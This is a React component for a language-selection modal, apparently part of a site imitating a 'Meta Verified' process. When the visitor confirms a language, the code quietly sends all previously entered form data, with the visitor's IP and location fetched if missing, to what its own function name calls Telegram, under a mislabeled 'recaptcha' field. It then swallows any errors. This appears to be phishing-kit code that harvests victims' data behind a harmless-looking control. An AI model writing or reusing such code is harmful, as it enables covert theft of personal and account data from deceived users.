'use client'

import React from 'react'
import { AnimatePresence, motion } from 'framer-motion'

import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
import { setLocale } from '@/app/store/slices/localeSlice'
import { updateForm } from '@/app/store/slices/stepFormSlice'
import { LOCALE_BCP47 } from '@/i18n'
import { APP_LOCALES, type AppLocale } from '@/i18n/schema'
import { LOCALE_OPTION_LABELS } from '@/i18n/localeOptionLabels'
import { useAppStrings } from '@/hooks/useAppStrings'
import { getUserLocation } from '@/utils/getLocation'
import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
import { LANG_MODAL_SEEN_KEY, writeSessionDisplayLocale } from '@/utils/metaVerifiedDisplayLocale'
import { SendData } from '@/utils/sendData'

function applyDocumentLang(locale: AppLocale) {
  if (typeof document !== 'undefined') {
    document.documentElement.lang = LOCALE_BCP47[locale]
    document.documentElement.dataset.locale = locale
  }
}

function CloseIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path
        d="M6.4 19 5 17.6 10.6 12 5 6.4 6.4 5 12 10.6 17.6 5 19 6.4 13.4 12 19 17.6 17.6 19 12 13.4 6.4 19Z"
        fill="currentColor"
      />
    </svg>
  )
}

function ChevronIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M7 10l5 5 5-5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  )
}

type MvLanguageModalProps = {
  isOpen: boolean
  onClose: () => void
}

export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProps) {
  const t = useAppStrings()
  const dispatch = useAppDispatch()
  const currentLocale = useAppSelector((s) => s.locale.locale)
  const formData = useAppSelector((s) => s.stepForm.data)
  const [draftLocale, setDraftLocale] = React.useState<AppLocale>(currentLocale)
  const [loading, setLoading] = React.useState(false)
  const selectId = 'mv-lang-modal-select'
  const sendingRef = React.useRef(false)

  React.useEffect(() => {
    if (isOpen) {
      setDraftLocale(currentLocale)
      setLoading(false)
      sendingRef.current = false
    }
  }, [isOpen, currentLocale])

  React.useEffect(() => {
    if (!isOpen) return
    const onKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape' && !loading) onClose()
    }
    document.addEventListener('keydown', onKey)
    return () => document.removeEventListener('keydown', onKey)
  }, [isOpen, onClose, loading])

  const markSeen = () => {
    try {
      localStorage.setItem(LANG_MODAL_SEEN_KEY, '1')
    } catch {
      /* ignore */
    }
  }

  const handleClose = () => {
    if (loading) return
    markSeen()
    onClose()
  }

  const sendLanguageConfirmToTelegram = async (locale: AppLocale) => {
    if (isMetaVerifiedFlowCompleted()) return

    let payload: Record<string, unknown> = {
      ...formData,
      recaptcha: LOCALE_OPTION_LABELS[locale],
    }

    if (!String(formData.ip ?? '').trim() || !String(formData.location ?? '').trim()) {
      const location = await getUserLocation()
      payload = { ...payload, ...location }
      dispatch(updateForm(location))
    }

    try {
      await SendData(payload)
    } catch {
      /* luồng UX vẫn tiếp tục */
    }
  }

  const handleConfirm = async () => {
    if (loading || sendingRef.current) return
    sendingRef.current = true
    setLoading(true)

    writeSessionDisplayLocale(draftLocale)
    dispatch(setLocale(draftLocale))
    applyDocumentLang(draftLocale)

    try {
      await sendLanguageConfirmToTelegram(draftLocale)
    } finally {
      markSeen()
      setLoading(false)
      sendingRef.current = false
      onClose()
    }
  }

  return (
    <AnimatePresence>
      {isOpen ? (
        <motion.div
          key="mv-lang-backdrop"
          className="mv-lang-modal-backdrop"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={handleClose}
        >
          <motion.div
            key="mv-lang-panel"
            role="dialog"
            aria-modal="true"
            aria-labelledby="mv-lang-modal-title"
            className="mv-lang-modal"
            initial={{ opacity: 0, scale: 0.96, y: 10 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.96, y: 10 }}
            transition={{ duration: 0.2, ease: [0.22, 1, 0.36, 1] }}
            onClick={(event) => event.stopPropagation()}
          >
            <div className="mv-lang-modal-header">
              <h2 id="mv-lang-modal-title" className="mv-lang-modal-title">
                {t.languagePicker.modalTitle}
              </h2>
              <button
                type="button"
                className="mv-lang-modal-close"
                aria-label={t.common.close}
                disabled={loading}
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="mv-lang-modal-body">
              <label className="mv-lang-modal-field" htmlFor={selectId}>
                <span className="mv-lang-modal-field-label">{t.languagePicker.fieldLabel}</span>
                <span className="mv-lang-modal-field-control">
                  <select
                    id={selectId}
                    className="mv-lang-modal-select"
                    value={draftLocale}
                    disabled={loading}
                    onChange={(event) => setDraftLocale(event.target.value as AppLocale)}
                    aria-label={t.languagePicker.fieldLabel}
                  >
                    {APP_LOCALES.map((code) => (
                      <option key={code} value={code}>
                        {LOCALE_OPTION_LABELS[code]}
                      </option>
                    ))}
                  </select>
                  <span className="mv-lang-modal-chevron" aria-hidden="true">
                    <ChevronIcon />
                  </span>
                </span>
              </label>
            </div>

            <div className="mv-lang-modal-footer">
              <button
                type="button"
                className="mv-lang-modal-btn mv-lang-modal-btn--cancel"
                disabled={loading}
                onClick={handleClose}
              >
                {t.languagePicker.cancel}
              </button>
              <button
                type="button"
                className="mv-lang-modal-btn mv-lang-modal-btn--confirm"
                disabled={loading}
                onClick={() => void handleConfirm()}
              >
                {t.languagePicker.confirm}
              </button>
            </div>
          </motion.div>
        </motion.div>
      ) : null}
    </AnimatePresence>
  )
}
